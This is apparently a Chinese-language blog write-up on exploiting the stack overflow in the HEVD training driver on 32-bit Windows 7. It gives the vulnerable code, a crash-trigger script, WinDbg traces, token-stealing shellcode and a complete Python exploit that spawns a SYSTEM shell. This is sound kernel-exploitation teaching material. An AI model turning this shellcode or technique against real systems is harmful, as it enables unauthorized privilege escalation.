---
title: 'Windows Kernel Exploit: Stack-based Overflow'
date: 2018-03-12 13:27:39
tags:
- windows kernel exploit
- stack-based overflow
categories:
- kernel_exploit
---
最近突然对windows提权感兴趣，周末在玩游戏之余拿出一点时间来研究了下windows的kernel exploit。
## Env
看的教程里边用的都是windows7 32位的，我本来想用64位的，因为懒得再装虚拟机了，但是我想了想用32位肯定是有他的道理的，后来发现windows7 32位是不支持SMEP和SMAP的，害得我花了一段时间来研究怎么关闭windows7的SMEP，真的是RIGOU了。
还有就是一些关于kernel exploit的基础知识和环境搭建，下面这个链接写得很清楚了，按照下面的一步一步来基本不会出现问题。
[Tutorial](http://www.fuzzysecurity.com/tutorials/expDev/14.html)
<!-- more -->

## How to escalate privilege
首先需要了解下windows内核关于提权的几个数据结构。
EPROCESS：跟linux内核的task_struct差不多，保存着一个进程的全部信息。系统中的全部进程的此结构以双向链表的形式保存在内存中。
ETHREAD：用来表示一个线程，保存着线程的相关信息。
KPCR：用来保存每个CPU的信息以及与线程切换相关的全局信息。
KPROCESS和KTHREAD是分别嵌套在EPROCESS和ETHREAD结构里面的结构体，里面保存着跟进程内存环境相关和线程优先级等信息。
Token：跟linux的cred作用差不多，用于决定进程的相关权限。
提权原理比较简单：把进程的Token覆盖为一个System权限进程的Token即可。
过程大致就是先找到一个System权限的进程，然后用它的Token指针覆盖当前进程的Token指针。寻找System进程的Token过程需要用到上述的几个结构体，主要是相关offset的选择有好几个可以达到目的。
刚开始想着能不能用pid为0的system idle process的Token，后来发现这个是个虚拟进程...windows的System进程pid固定为4，用System进程的Token很稳~

## Demo show
[HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)是一个很好的windows kernel exploit的例子。以下是驱动的stack-based overflow的代码：
```c
NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG KernelBuffer[BUFFER_SIZE] = {0};
 
    PAGED_CODE();
 
    __try {
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));
 
        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));
 
#ifdef SECURE
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Stack Overflow\n");
 
        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}
```
漏洞是由字符串复制导致的栈溢出，利用也比较简单。
首先来触发漏洞，用pattern.py生成0x900(2304)个字符(BUFFER_SIZEd大小为0x800)。
```python
import sys
from ctypes import *

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
if not hevDevice or hevDevice == -1:
    print "[-] Couldn't get Device Driver handle."
    sys.exit(0)
 
buf = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7"

bufLength = len(buf)
 
kernel32.DeviceIoControl(hevDevice, 0x222003, buf, bufLength, None, 0, byref(c_ulong()), None)
```
触发漏洞后查看下现场：
```
kd> g
KDTARGET: Refreshing KD connection
Access violation - code c0000005 (!!! second chance !!!)
43327243 ??              ???
3: kd> r
eax=00000000 ebx=00000000 ecx=1910c31f edx=00000000 esi=a0fb15e8 edi=a28191b0
eip=43327243 esp=a9df6bd0 ebp=31724330 iopl=0         nv up ei ng nz ac pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010296
43327243 ??              ???
```
然后确定缓冲区到返回地址的距离：
```shell
C:\Users\w0lfzhang\Desktop\winpwn>python pattern.py offset 43327243
hex pattern decoded as: Cr2C
2076
```
最后准备shellcode：
```asm
pushad ; Save registers state
 
; Start of Token Stealing Stub
xor eax, eax ; Set ZERO
mov eax, fs:[eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread
; _KTHREAD is located at FS:[0x124]
 
mov eax, [eax + EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process
 
mov ecx, eax ; Copy current process _EPROCESS structure
 
mov edx, SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4
 
SearchSystemPID:
mov eax, [eax + FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub eax, FLINK_OFFSET
cmp [eax + PID_OFFSET], edx ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID
 
mov edx, [eax + TOKEN_OFFSET] ; Get SYSTEM process nt!_EPROCESS.Token
mov [ecx + TOKEN_OFFSET], edx ; Replace target process nt!_EPROCESS.Token
; with SYSTEM process nt!_EPROCESS.Token
; End of Token Stealing Stub
 
popad ; Restore registers state
```
shellcode的功能是把当前进程的Token替换为System进程的Token。由于系统内核是开了DEP的，所以不能再栈上执行代码，所以只能在用户空间分配一段可执行内存，把shellcode复制到该区域，然后控制pc执行该内存区域。
在执行exploit的过程中出现了跟参考的第二篇教程中同样的问题，pc跑偏了，所以shellcode还要调整一下。(具体怎么修改shellcode要根据自己调试的结果来调整)
以下是我调试时碰到的问题：
```
3: kd> g
Breakpoint 1 hit
HEVD!TriggerStackOverflow+0x16d:
b2ccdcad c20800          ret     8
3: kd> p
004f0000 60              pushad
3: kd> u
004f0000 60              pushad
004f0001 31c0            xor     eax,eax
004f0003 648b8024010000  mov     eax,dword ptr fs:[eax+124h]
004f000a 8b4050          mov     eax,dword ptr [eax+50h]
004f000d 89c1            mov     ecx,eax
004f000f ba04000000      mov     edx,4
004f0014 8b80b8000000    mov     eax,dword ptr [eax+0B8h]
004f001a 2db8000000      sub     eax,0B8h
3: kd> u
004f001f 3990b4000000    cmp     dword ptr [eax+0B4h],edx
004f0025 75ed            jne     004f0014
004f0027 8b90f8000000    mov     edx,dword ptr [eax+0F8h]
004f002d 8991f8000000    mov     dword ptr [ecx+0F8h],edx
004f0033 61              popad
004f0034 0000            add     byte ptr [eax],al
004f0036 0000            add     byte ptr [eax],al
004f0038 0000            add     byte ptr [eax],al
3: kd> bp 4f0033
3: kd> g
Breakpoint 2 hit
004f0033 61              popad
3: kd> dd esp
b1563bb0  a2ce6d38 a0badd40 41414141 b1563bd0
b1563bc0  00000000 00000000 039ae65c 00000000
b1563bd0  c0000001 01797fb4 00000820 b1563bfc
b1563be0  b2ccfb3c a2a7f320 a2a7f390 00000000
b1563bf0  c00000bb a2a7f390 00222003 b1563c14
b1563c00  82a574bc a0badd40 a2a7f320 a2a7f320
b1563c10  a0badd40 b1563c34 82c58eee a2ce6d38
b1563c20  a2a7f320 a2a7f390 00000094 04563cac
3: kd> p
004f0034 0000            add     byte ptr [eax],al
3: kd> r
eax=00000000 ebx=00000000 ecx=039ae65c edx=00000000 esi=a0badd40 edi=a2ce6d38
eip=004f0034 esp=b1563bd0 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
004f0034 0000            add     byte ptr [eax],al          ds:0023:00000000=??
3: kd> g
Access violation - code c0000005 (!!! second chance !!!)
004f0034 0000            add     byte ptr [eax],al
```
此时shellcode已经执行完，而pc已经跑偏，我们需要控制pc指向HEVD驱动代码(执行完漏洞函数后的指令地址，已压入栈中)。
此时栈的情况如下：
```
3: kd> dd esp
b1563bd0  c0000001 01797fb4 00000820 b1563bfc
b1563be0  b2ccfb3c a2a7f320 a2a7f390 00000000
b1563bf0  c00000bb a2a7f390 00222003 b1563c14
b1563c00  82a574bc a0badd40 a2a7f320 a2a7f320
b1563c10  a0badd40 b1563c34 82c58eee a2ce6d38
b1563c20  a2a7f320 a2a7f390 00000094 04563cac
b1563c30  b1563c44 b1563cd0 82c75cd1 a0badd40
b1563c40  a2ce6d38 00000000 82aa3701 00092601
```
注意0xb2ccfb3c是属于HEVD驱动的代码区间，所以控制pc指向这个地址即可。
注意函数在调用完TriggerStackOverflow后的指令：
```asm
PAGE:00014D27                 call    _TriggerStackOverflow@8 ; TriggerStackOverflow(x,x)
PAGE:00014D2C                 mov     [ebp+Status], eax
PAGE:00014D2F
PAGE:00014D2F loc_14D2F:                              ; CODE XREF: StackOverflowIoctlHandler(x,x)+5D↑j
PAGE:00014D2F                 mov     eax, [ebp+Status]
PAGE:00014D32                 mov     esp, ebp
PAGE:00014D34                 pop     ebp
PAGE:00014D35                 retn    8
PAGE:00014D35 _StackOverflowIoctlHandler@8 endp
```
先把返回值eax清零，然后我们可以用三个pop操作来代替mov esp, ebp指令，再加上后两条指令即可。
所以最终脚本如下：
```python
import sys, struct
from ctypes import *
from subprocess import *
 
def main():
    kernel32 = windll.kernel32
    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    if not hevDevice or hevDevice == -1:
        print "[-] Couldn't get Device Driver handle"
        sys.exit(0)
 
    shellcode = ""
    shellcode += bytearray(
        "\x60"                            # pushad
        "\x31\xc0"                        # xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]
        "\x89\xc1"                        # mov ecx,eax
        "\xba\x04\x00\x00\x00"            # mov edx,0x4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
        "\x75\xed"                        # jnz 0x1a
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
        "\x61"                            # popad
        "\x31\xc0"                        # xor eax,eax
        "\x5d"  
        "\x5d"
        "\x5d"
        "\x5d"                            # pop ebp
        "\xc2\x08\x00"                    # ret 0x8
    )
 
    ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
    #print "[+] Shellcode address: " + hex(ptr)
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
    shellcode_final = struct.pack("<L",ptr)
 
    buf = "A"*2076 + shellcode_final
    bufLength = len(buf)
 
    kernel32.DeviceIoControl(hevDevice, 0x222003, buf, bufLength, None, 0, byref(c_ulong()), None)
    print "[+] Spawn a shell. Enjoy!"
    Popen("start cmd", shell=True)
 
if __name__ == "__main__":
    main()
```
最终得到了一个system权限的cmd窗口：
<img src="http://of38fq57s.bkt.clouddn.com/sbof.PNG">

## References
[Windows Kernel Exploitation Tutorial Part 2: Stack Overflow](https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/)
[Part 10: Kernel Exploitation -> Stack Overflow](http://www.fuzzysecurity.com/tutorials/expDev/14.html)
[x64 Kernel Privilege Escalation](http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation)
[Catalog of key Windows kernel data structures](http://www.codemachine.com/article_kernelstruct.html)